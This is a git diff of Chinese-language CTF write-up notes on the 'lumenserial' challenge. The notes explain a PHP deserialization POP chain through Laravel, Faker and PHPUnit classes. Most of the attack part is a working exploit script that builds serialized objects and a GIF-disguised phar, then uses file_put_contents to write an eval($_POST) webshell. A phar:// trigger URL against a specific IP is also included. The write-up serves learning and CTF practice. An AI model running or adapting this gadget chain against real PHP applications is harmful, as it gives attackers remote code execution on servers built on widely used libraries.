@@ -621,6 +621,11 @@ p师傅本意:
 
 # lumenserial
 
+php魔法方法:
+
+* __call()   调用不存在方法时，会调用该方法，可以根据此方法实现php的伪函数重载
+* __destruct()   析构函数，当对象销毁时，会调用该方法
+
 漏洞比较明显，重要的是找POP链。太菜，复现为主。
 
 ```
@@ -672,6 +677,8 @@ download函数使用了`file_get_contents`,可以结合`Phar`构造反序列化�
 
 gadget1:
 
+`illuminate/broadcasting/PendingBroadcast.php:55`
+
 ```
 namespace Illuminate\Broadcasting {
     class PendingBroadcast
@@ -690,9 +697,11 @@ namespace Illuminate\Broadcasting {
 }
 ```
 
-通过传递`$this->event`执行其他类的`__call`方法。
+通过传递由于正常类中的`dispatch`方法中没有调用危险函数，所以只能查找`__call`方法中执行危险函数的类，并且该类中不存在`dispatch`方法，因为PHP在调用不存在的方法时，就会调用`__call`方法。
 
 gadget2:
+
+`fzaninotto/faker/src/Faker/ValidGenerator.php:52`
 
 ```
 namespace Faker{
@@ -720,88 +729,218 @@ namespace Faker{
 }
 ```
 
+该类中的`__call`方法调用了两次危险函数。
+
+`call_user_func_array`中的`$name`不可控，且`$name='dispatch'`,所以`$res`也暂时不可控，需要寻找一个新的gadget来使得`$res`可控，这样在调用`call_user_func`时，`call_user_func`的两个参数均可控，就可以写入shell。
+
 gadget3:
+
+`fzaninotto/faker/src/Faker/Generator.php:277`
+
+```
+public function __call($method, $attributes)
+{
+    return $this->format($method, $attributes);
+}
+public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this->getFormatter($formatter), $arguments);
+}
+public function getFormatter($formatter)
+{
+    if (isset($this->formatters[$formatter])) {
+        return $this->formatters[$formatter];
+    }
+    .............
+}
+```
+
+该类中的`$attributes`可控，可令其为`array('kingkk')`，该类中`__call`方法中的`$method`不可控，但是该方法最终会调用`getFormatter`方法，并且`$this->formatters`可控，`$method`的虽然不可控，但是它的值是确定的，所以返回值也就可控。
+
+通过嵌套调用
+
+```
+$g1 = new \Faker\Generator(array('kingkk' => $si ));
+$g2 = new \Faker\Generator(array("dispatch" => array($g1, "getFormatter")));
+```
+
+这样的话:
+
+`$this->getFormatter($formatter)相当于$this->getFormatter("dispatch")`将返回`array($g1, "getFormatter")`。
+
+然后:
+
+`return call_user_func_array(array($g1, "getFormatter"), array('kingkk'));`
+
+然后继续调用`getFormatter`方法:
+
+这时候，将返回`$si`。
 
 gadget4:
 
+`phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26`:
+
+```
+public function invoke(Invocation $invocation)
+{
+    return \call_user_func_array($this->callback, $invocation->getParameters());
+}
+public function getParameters(): array
+{
+	return $this->parameters;
+}
+```
+
+两个参数均可控,其中`Invocation`只是个接口。找到具体的实现类即可。
+
 gadget5:
 
+```
+class StaticInvocation implements Invocation, SelfDescribing
+{    
+    function __construct(){
+        $this->parameters = array('./k.php','<?php phpinfo();eval($_POST["k"]);?>');
+    }
+
+    public function getParameters(): array
+    {
+        return $this->parameters;
+    }
+}
+```
+
 exploit:
+
+可以正常序列化以及反序列化:
 
 ```
 <?php
 namespace Illuminate\Broadcasting{
     class PendingBroadcast{
-        protected $events;
-        protected $event;
-        public function __construct($events, $event)
+        function __construct(){
+            $this->events = new \Faker\ValidGenerator();
+            $this->event = 'kingkk';
+        }
+
+        public function __destruct()
         {
-            $this->event = $event;
-            $this->events = $events;
+            // $this->events->dispatch($this->event);
+            $this->events->dispatch($this->event);
         }
     }
+
 }
 
-namespace Faker{
-    class Generator{
-        protected $formatters;
-        function __construct($forma){
-            $this->formatters = $forma;
-        }
-    }
-    class ValidGenerator{
-        protected $generator;
-        protected $validator;
-        protected $maxRetries;
-
-        public function __construct($generator, $validator, $maxRetries = 10000){
-            $this->generator = $generator;
-            $this->validator = $validator;
-            $this->maxRetries = $maxRetries;
-        }
-    }
-}
 
 namespace PHPUnit\Framework\MockObject\Invocation{
     class StaticInvocation{
-        function __construct($parameters){
-            $this->parameters = $parameters;
+
+        function __construct(){
+            $this->parameters = array('./k.php','<?php phpinfo();eval($_POST["k"]);?>');
+        }
+
+        public function getParameters(): array
+        {
+            return $this->parameters;
         }
     }
 }
 
 namespace PHPUnit\Framework\MockObject\Stub{
+    use PHPUnit\Framework\MockObject\Invocation\StaticInvocation;
     class ReturnCallback{
-        public function __construct($callback){
-            $this->callback = $callback;
+        function __construct(){
+            $this->callback = 'file_put_contents';
         }
-    }   
+
+        public function invoke(StaticInvocation $invocation)
+        {
+            echo "done\n";
+            return \call_user_func_array($this->callback, $invocation->getParameters());
+        }
+
+       
+    }
 }
 
-# exp func call
-namespace{
-    $exp_func = "file_put_contents";
-    $exp_args = ["C:\\phpstudy2018\\PHPTutorial\\WWW\\ctf\\pwnhub\\lumenserial\\bbbb.php", base64_decode("PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4=")];
-    $exp_args_obj = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($exp_args);
-    $exp_call_obj = new PHPUnit\Framework\MockObject\Stub\ReturnCallback($exp_func);
+namespace Faker{
+    class ValidGenerator{
+        function __construct(){
+            $si = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
+            $g1 = new \Faker\Generator(array('kingkk' => $si ));
+            $g2 = new \Faker\Generator(array("dispatch" => array($g1, "getFormatter")));
 
-    $tmp_arr = ["gogogo" => $exp_args_obj];
-    $s4_obj = new Faker\Generator($tmp_arr);
+            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
 
-    $get_func_arr = array("dispatch"=> array($s4_obj, "getFormatter"));
-    $s3_obj = new Faker\Generator($get_func_arr);
+            $this->validator = array($rc, "invoke");
+            $this->generator = $g2;
+            $this->maxRetries = 1;
+        }
 
-    $s2_obj = new Faker\ValidGenerator($s3_obj, array($exp_call_obj,"invoke"), 2);
+        public function __call($name, $arguments)
+        {
+            $i = 0;
+            do {
+                $res = call_user_func_array(array($this->generator, $name), $arguments);
+                echo "res".$i . "\n";
+                var_dump($res);
+                $i++;
+                if ($i > $this->maxRetries) {
+                    break;
+                }
+            } while (!call_user_func($this->validator, $res));
 
-    $s1_obj = new Illuminate\Broadcasting\PendingBroadcast($s2_obj, "gogogo");
-    echo urlencode(serialize($s1_obj))."\n\r\n\r";
+            return $res;
+        }
+    }
+
+    class Generator{
+        function __construct($form){
+            $this->formatters = $form;
+        }
+
+        public function __call($method, $attributes)
+        {
+            echo "method:" . $method . "\n";
+            echo "attrubutes\n";
+            var_dump($attributes);
+            return $this->format($method, $attributes);
+        }
+
+        public function format($formatter, $arguments = array())
+        {
+            return call_user_func_array($this->getFormatter($formatter), $arguments);
+        }
+
     
-    $p = new Phar('./exploit.phar', 0);
-    $p->startBuffering();
-    $p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
-    $p->setMetadata($s1_obj);
-    $p->addFromString('1.txt','text');
-    $p->stopBuffering();
+        public function getFormatter($formatter)
+        {
+            if (isset($this->formatters[$formatter])) {
+                echo "returnGenerator \n";
+                var_dump($this->formatters[$formatter]);
+                return $this->formatters[$formatter];
+            }
+        }
+    }
+
 }
+namespace{
+    $exp = new Illuminate\Broadcasting\PendingBroadcast();
+    // print_r(urlencode(serialize($exp)));
+    unserialize(serialize($exp));
+    // phar
+    // $p = new Phar('./k.phar', 0);
+    // $p->startBuffering();
+    // $p->setStub('GIF89a<?php __HALT_COMPILER(); ?\>');
+    // $p->setMetadata($exp);
+    // $p->addFromString('1.txt','text');
+    // $p->stopBuffering();
+}
+```
+
+最后，上传生成的文件，然后:
+
+```
+http://51.158.73.123:8080/server/editor?action=Catchimage&source[]=phar:///var/www/html/upload/image/xxx.gif
 ```
 
